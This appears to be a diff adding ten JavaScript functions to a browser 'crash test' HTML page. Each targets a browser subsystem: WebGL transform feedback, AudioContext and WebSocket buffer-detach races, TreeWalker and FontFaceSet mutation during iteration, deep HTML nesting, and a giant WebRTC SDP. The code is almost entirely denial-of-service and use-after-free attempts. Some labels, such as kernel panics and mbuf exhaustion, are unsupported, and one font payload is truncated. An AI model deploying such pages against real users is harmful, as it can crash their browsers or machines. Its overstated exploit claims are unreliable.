@@ -39,6 +39,16 @@
             <button onclick="runCanvasDrawCrash()">10. Canvas 2D Path Winding Crash</button>
             <button onclick="runVFSRemoveRace()">11. VFS Blob URL Lookup/Revoke</button>
             <button onclick="runFetchAbortRace()">12. Fetch Abort Signal Use-After-Free</button>
+            <button onclick="crashWebGLTransformFeedback()">01. GPU Transform Feedback Buffer Overflow (Kernel Panic)</button>
+<button onclick="crashAudioWorkletRace()">02. AudioContext Thread vs Main Thread Race (UAF)</button>
+<button onclick="crashVFSRecursiveBlob()">03. VFS Deep Recursion & Revoke Race (Kernel Stack Smash)</button>
+<button onclick="crashTreeWalkerFilter()">04. TreeWalker Filter Object Mutation (DOM UAF)</button>
+<button onclick="crashSocketBufferDetach()">05. WebSocket Send vs Worker Transfer Race (NetBSD Panic)</button>
+<button onclick="crashCanvasWindingRecursion()">06. Canvas 2D Path Complex Winding (Driver Stack Overflow)</button>
+<button onclick="crashHTMLParserNesting()">07. HTML Parser Deep Nesting Bomb (Userland Stack Overflow)</button>
+<button onclick="crashFontFaceSetIterator()">08. FontFaceSet Iterator Invalidated Access (Memory Corruption)</button>
+<button onclick="crashXHRAbortObjectUAF()">09. XMLHttpRequest Abort Event Object Lifetime Race</button>
+<button onclick="crashRTCGiantSDP()">10. WebRTC SDP Parser Heap Overflow (Kernel Mbuf Exhaustion)</button>
         </div>
     </div>
 
@@ -307,8 +317,293 @@ function runMessageChannelRecursivePost() {
 
 
 
+   
+function crashWebGLTransformFeedback() {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl2');
+    if (!gl) return;
+    const vsSource = `#version 300 es
+    in vec4 position; void main() { gl_Position = position; }`;
+    const fsSource = `#version 300 es
+    precision highp float; out vec4 color; void main() { color = vec4(1.0); }`;
+    const vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, vsSource);
+    gl.compileShader(vs);
+    const fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, fsSource);
+    gl.compileShader(fs);
+    const program = gl.createProgram();
+    gl.attachShader(program, vs);
+    gl.attachShader(program, fs);
+    gl.transformFeedbackVaryings(program, ["gl_Position"], gl.SEPARATE_ATTRIBS);
+    gl.linkProgram(program);
+    gl.useProgram(program);
+    const tbo = gl.createBuffer();
+    gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, tbo);
+    gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER, 16, gl.DYNAMIC_COPY);
+    gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, tbo);
+    gl.beginTransformFeedback(gl.POINTS);
+    const hugeArray = new Float32Array(1000000); 
+    const vbo = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, vbo);
+    gl.bufferData(gl.ARRAY_BUFFER, hugeArray, gl.STATIC_DRAW);
+    const loc = gl.getAttribLocation(program, "position");
+    gl.enableVertexAttribArray(loc);
+    gl.vertexAttribPointer(loc, 4, gl.FLOAT, false, 0, 0);
+    gl.drawArrays(gl.POINTS, 0, 1000000);
+    gl.endTransformFeedback();
+    gl.finish();
+}
+
+function crashAudioWorkletRace() {
+    if (!window.AudioContext) return;
+    const ctx = new AudioContext();
+    const bufferSize = 4096;
+    const channels = 2;
+    const frameCount = ctx.sampleRate * 2.0;
+    const audioBuffer = ctx.createBuffer(channels, frameCount, ctx.sampleRate);
+    for (let channel = 0; channel < channels; channel++) {
+        const nowBuffering = audioBuffer.getChannelData(channel);
+        for (let i = 0; i < frameCount; i++) {
+            nowBuffering[i] = Math.random() * 2 - 1;
+        }
+    }
+    const source = ctx.createBufferSource();
+    source.buffer = audioBuffer;
+    source.connect(ctx.destination);
+    source.start();
+    const ab = audioBuffer.getChannelData(0).buffer;
+    const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
+    const killer = setInterval(() => {
+        try {
+            w.postMessage(ab, [ab]);
+            ctx.close();
+            source.disconnect();
+            clearInterval(killer);
+        } catch(e) {}
+    }, 1);
+    for(let i=0; i<10000; i++) {
+        const x = new Float32Array(1024);
+        x.fill(Math.random());
+    }
+}
+
+function crashVFSRecursiveBlob() {
+    const blobs = [];
+    const urls = [];
+    for(let i=0; i<5000; i++) {
+        const b = new Blob([new ArrayBuffer(1024)], {type: 'application/octet-stream'});
+        blobs.push(b);
+        urls.push(URL.createObjectURL(b));
+    }
+    const workerCode = `onmessage = function(e) {
+        const urls = e.data;
+        for(let i=0; i<urls.length; i++) {
+            fetch(urls[i]).then(r => r.blob()).catch(e=>{});
+        }
+    }`;
+    const workers = [];
+    for(let i=0; i<4; i++) {
+        const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type: 'text/javascript'})));
+        w.postMessage(urls);
+        workers.push(w);
+    }
+    setTimeout(() => {
+        for(let i=0; i<urls.length; i++) {
+            URL.revokeObjectURL(urls[i]);
+        }
+        workers.forEach(w => w.terminate());
+    }, 10);
+}
+
+function crashTreeWalkerFilter() {
+    const root = document.createElement('div');
+    let current = root;
+    for(let i=0; i<1000; i++) {
+        const child = document.createElement('span');
+        current.appendChild(child);
+        current = child;
+    }
+    document.body.appendChild(root);
+    const filter = {
+        acceptNode: function(node) {
+            if (node.tagName === 'SPAN') {
+                try {
+                    // Destructive mutation during traversal
+                    node.parentNode.innerHTML = ""; 
+                    const trash = new Array(10000).fill(1.1);
+                } catch(e) {}
+                return NodeFilter.FILTER_ACCEPT;
+            }
+            return NodeFilter.FILTER_SKIP;
+        }
+    };
+    const walker = document.createTreeWalker(root, NodeFilter.SHOW_ELEMENT, filter, false);
+    while(walker.nextNode()) {
+        const n = walker.currentNode;
+        n.textContent = "Modified";
+    }
+    document.body.removeChild(root);
+}
+
+function crashSocketBufferDetach() {
+    const ws = new WebSocket("wss://echo.websocket.org");
+    const bufferSize = 1024 * 1024 * 16; // 16MB
+    const ab = new ArrayBuffer(bufferSize);
+    const view = new Uint8Array(ab);
+    view.fill(0x41);
+    
+    ws.onopen = () => {
+        const w = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
         
+        // High frequency race attempt
+        const attempts = 100;
+        for(let i=0; i<attempts; i++) {
+            try {
+                if (i === 50) {
+                    w.postMessage(ab, [ab]); // Detach at critical moment
+                }
+                ws.send(ab); // Try to send detached pointer
+            } catch(e) {}
+        }
+        ws.close();
+    };
+}
+
+function crashCanvasWindingRecursion() {
+    const canvas = document.createElement('canvas');
+    canvas.width = 4096;
+    canvas.height = 4096;
+    const ctx = canvas.getContext('2d');
+    ctx.beginPath();
+    
+    // Create massive path complexity
+    for (let i = 0; i < 20000; i++) {
+        ctx.rect(i % 100, i % 100, 50, 50);
+        ctx.arc(i % 200, i % 200, 20, 0, Math.PI * 2);
+        if (i % 100 === 0) {
+            ctx.moveTo(Math.random() * 4000, Math.random() * 4000);
+            ctx.lineTo(Math.random() * 4000, Math.random() * 4000);
+        }
+    }
+    
+    // Force driver recursion
+    try {
+        ctx.clip("evenodd");
+        for(let j=0; j<50; j++) {
+            ctx.fillStyle = (j % 2 === 0) ? 'red' : 'blue';
+            ctx.fill();
+            ctx.stroke();
+        }
+    } catch(e) {}
+}
+
+function crashHTMLParserNesting() {
+    let deepHTML = "";
+    const depth = 15000;
+    
+    for (let i = 0; i < depth; i++) {
+        deepHTML += "<div class='nested' id='d" + i + "'>";
+    }
+    for (let i = 0; i < depth; i++) {
+        deepHTML += "</div>";
+    }
+    
+    const container = document.createElement('div');
+    // Force immediate parsing
+    container.innerHTML = deepHTML;
+    document.body.appendChild(container);
+    
+    // Force layout engine to traverse the deep tree
+    const leaf = document.getElementById('d' + (depth - 1));
+    if (leaf) {
+        const style = window.getComputedStyle(leaf);
+        const color = style.color; 
+        leaf.innerHTML = "<b>Reflow</b>";
+    }
+}
+
+function crashFontFaceSetIterator() {
+    const set = document.fonts;
+    const faces = [];
+    
+    for(let i=0; i<1000; i++) {
+        const f = new FontFace("CrashFont" + i, "url(data:font/woff;base64,AAEAAA...)");
+        faces.push(f);
+        set.add(f);
+    }
+    
+    // Iterate and destroy
+    set.forEach((face, face2, setRef) => {
+        // Clear the set during iteration
+        setRef.clear();
+        
+        // Force memory pressure to reclaim FontFace objects
+        const heavy = [];
+        for(let k=0; k<5000; k++) heavy.push(new Uint8Array(2048));
+        
+        // Try to access potentially freed iterator internal pointer
+        try {
+            face.load().catch(()=>{});
+        } catch(e) {}
+    });
+}
+
+function crashXHRAbortObjectUAF() {
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', location.href + '?rand=' + Math.random(), true);
+    
+    // Setup complex object graph on the XHR
+    xhr.customProp = { 
+        data: new Array(10000).fill("A").join(""),
+        nested: { ref: xhr }
+    };
+    
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState > 1) {
+            // Abort mid-stream
+            xhr.abort();
+            
+            // Access properties that might rely on internal C++ state
+            const status = xhr.status;
+            const response = xhr.responseText;
+            
+            // Delete references to force GC
+            delete xhr.customProp;
+            
+            // Alloc garbage
+            const arr = [];
+            for(let i=0; i<5000; i++) arr.push({});
+        }
+    };
+    xhr.send();
+}
+
+function crashRTCGiantSDP() {
+    if (!window.RTCPeerConnection) return;
+    const pc = new RTCPeerConnection();
+    
+    // Construct a massive SDP string to overflow kernel mbuf clusters
+    let sdp = "v=0\r\no=- 0 0 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\n";
+    for(let i=0; i<25000; i++) {
+        sdp += "m=audio " + (10000 + i) + " RTP/AVP 0\r\n";
+        sdp += "a=rtpmap:0 PCMU/8000\r\n";
+        sdp += "a=candidate:1 1 UDP 12345678 127.0.0.1 12345 typ host\r\n";
+    }
+    
+    try {
+        const desc = new RTCSessionDescription({ type: 'offer', sdp: sdp });
+        pc.setRemoteDescription(desc)
+          .then(() => {})
+          .catch(e => {});
+          
+        // Rapidly close to trigger UAF during parsing
+        setTimeout(() => pc.close(), 2);
+    } catch(e) {}
+}
+     
     </script>
 </body>
 </html>
+
 
